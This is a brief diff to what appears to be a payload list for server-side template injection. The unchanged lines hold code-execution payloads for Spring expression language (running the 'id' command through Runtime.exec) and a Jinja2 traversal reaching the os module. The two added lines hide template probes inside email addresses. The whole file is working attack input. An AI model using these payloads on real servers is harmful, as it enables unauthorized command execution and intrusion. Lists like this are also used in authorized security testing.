@@ -136,3 +136,5 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 {{self._TemplateReference__context.namespace.__init__.__globals__.os}}
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 {^xyzm42}1764{/xyzm42}
+test+(${{7\*7}})@example.com
+"<%=7\*7%>"@example.com
